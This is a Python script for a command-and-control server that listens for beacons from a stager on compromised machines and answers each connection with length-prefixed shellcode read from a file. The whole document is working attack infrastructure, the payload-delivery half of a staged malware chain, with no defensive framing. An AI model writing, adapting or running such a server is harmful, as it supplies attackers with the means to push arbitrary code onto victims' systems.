#!/usr/bin/env python3

# Setup a server to listen for beacons from stager
# Reads shellcode from a file

import argparse
import socketserver
import struct


# Server class, reads in shellcode from file and serves to clients 
class C2_Server(socketserver.BaseRequestHandler):

	
	# Override init to add payload file to self
	def __init__(self, request, client_address, server):
		self.payload_file = payload_file
		self.allow_reuse_address = True
		print(f"[+] Using payload from file {self.payload_file}")	
		super().__init__(request, client_address, server)

	# Read shellcode from file. Assumes size <= 1k 
	def get_payload(self, filename):
		with open(filename, 'rb') as fp:
			payload = fp.read(1024).strip()

		return payload, len(payload)

	# Handler for connections. Receive data and send shellcode
	def handle(self):
		self.data = self.request.recv(1024).strip()
		print(f"[+] Connection from {self.client_address[0]}:")
		print(self.data)

		# send payload
		payload, len_payload = self.get_payload(self.payload_file)

		print(f"Sending payload with length {len_payload}")
		data_len = struct.pack(">i", len_payload)
		
		response = data_len + payload
		self.request.sendall(response)
	


# Activate server and stay on until Ctrl C
def serve_c2(host, port, payload_file):
	
	with socketserver.TCPServer((host, port), C2_Server) as server:

		print("--===============================--")
		print(f"  Starting C2 Server (port {port})")
		print("--===============================--")
		server.RequestHandlerClass.payload_file = payload_file
		server.serve_forever()


if __name__ == "__main__":

	parser = argparse.ArgumentParser(description="Server for C2 clients to server shellcode")
	parser.add_argument('-p', dest='port', action='store', help="port to listen on", default=1776)
	parser.add_argument('-f', dest='payload_file', action='store', help="file with shellcode", default="shellcode")

	args = parser.parse_args()

	host = "0.0.0.0"
	port = args.port
	payload_file = args.payload_file

	# create server, bind port
	try:
		serve_c2(host, port, payload_file)


	except OSError as e:
		print("[!] Port was bound")
		port = port+1
		serve_c2(host, port, payload_file)
	
	except KeyboardInterrupt:
		print("\n[!] Caught Keyboard Interrupt, shutting down server")

